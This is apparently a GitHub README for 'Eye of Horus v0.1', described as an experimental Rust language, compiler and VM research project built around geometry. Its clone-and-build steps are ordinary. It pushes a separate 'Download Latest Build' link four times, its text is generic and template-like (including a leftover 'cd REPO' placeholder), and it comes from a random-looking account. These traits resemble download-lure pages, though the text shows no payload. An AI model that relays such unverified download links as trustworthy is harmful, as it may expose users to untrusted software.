# Eye of Horus v0.1 - geometry-native programming language 2026

> **Eye of Horus v0.1 is an experimental Rust programming language platform that treats geometry as a native part of computation while bringing parsing, compilation, and virtual-machine research together.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lewisseanhyct2959/eye-of-horus-vm-research?style=flat-square)](https://github.com/lewisseanhyct2959/eye-of-horus-vm-research)

---

<p align="center">
  <a href="https://lewisseanhyct2959.github.io/eye-of-horus-vm-research/">
    <img src="https://img.shields.io/badge/Download-Eye%20of%20Horus%20Latest-brightgreen?style=for-the-badge" alt="Download Eye of Horus">
  </a>
</p>

> **[Download Eye of Horus v0.1](https://lewisseanhyct2959.github.io/eye-of-horus-vm-research/)**

---

[Download Latest Build](https://lewisseanhyct2959.github.io/eye-of-horus-vm-research/)

---

## What Is Eye of Horus?

Eye of Horus investigates a language design in which geometry is built into the programming model. Shapes, spatial relationships, and movement are not treated solely as outside application concepts; instead, the project examines their possible roles in syntax, execution, and runtime behavior through an experimental Rust implementation.

The repository is intended for language designers, researchers, and developers studying compiler and interpreter construction alongside spatial execution models. Its research foundation covers AST structure, lexer and parser pipelines, virtual-machine ideas, and a formal direction for continued language development.

---

## Capabilities

- A geometry-native source model for designing spatially aware languages
- A spatial execution approach that expresses computation through geometric concepts
- Research-oriented lexer, parser, and compiler components
- Deterministic pulse simulation for repeatable runtime testing
- RFC-based processes for developing and documenting language changes
- Concepts for visual debugging and learning-focused tooling
- Initial LSP and VS Code integration scaffolding
- A formal specification framework for recording core language behavior

---

## Getting Started

Use the Rust toolchain to retrieve and compile the project:

```bash
git clone https://github.com/lewisseanhyct2959/eye-of-horus-vm-research.git
cd REPO
cargo build
```

After the initial build, local experimentation can be performed through the available Rust entrypoint or the launch procedure documented in the repository.

---

## Working with the Project

Eye of Horus is primarily a research and development environment, not a completed end-user application. Common activities include tracing the language pipeline, examining generated AST data, trying individual compiler stages, and studying how geometric or spatial concepts affect execution.

A representative development cycle is:

1. Compile the project
2. Launch the parser or interpreter components
3. Examine compiler results or virtual-machine behavior
4. Modify language rules, RFC material, or specification drafts
5. Iterate with the available editor-tooling scaffolds

When sample programs or demonstrations are present, they can be used to compare parser output and runtime behavior between revisions.

---

## Configuration

Configuration may be found in the Rust workspace, project source, specification drafts, or language and tooling files included in the repository.

For development purposes, a configuration arrangement may resemble the following:

```toml
[language]
mode = "experimental"

[execution]
model = "spatial"

[tooling]
lsp = true
```

For additional options, inspect the repository root, workspace configuration, and editor-specific directories for runtime and tooling settings.

---

## Requirements

- A Rust toolchain capable of building and running the project
- A development environment appropriate for compiler and programming-language research
- Local storage for the source tree, build artifacts, and experimentation records
- Optional editor tooling for LSP or VS Code support
- A system that can run the project's experimental Rust components

---

## Frequently Asked Questions

**Is Eye of Horus production-ready?**  
No. Version 0.1 is an experimental research foundation for geometry-native language concepts, compiler organization, and runtime investigation.

**Where can I follow project changes?**  
Review the repository history together with its RFC, specification, and tooling files. When packaged access is available, the latest build link above provides the primary download route.

**How can I alter the language's behavior?**  
Study the parser, compiler, interpreter, and specification layers. Language experiments can be made through source changes and documented in the project's RFC-style materials.

**What should I check if it does not start right away?**  
Confirm that Rust is installed, rebuild the workspace, and look through the repository for required setup instructions, local configuration, or editor-integration guidance.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
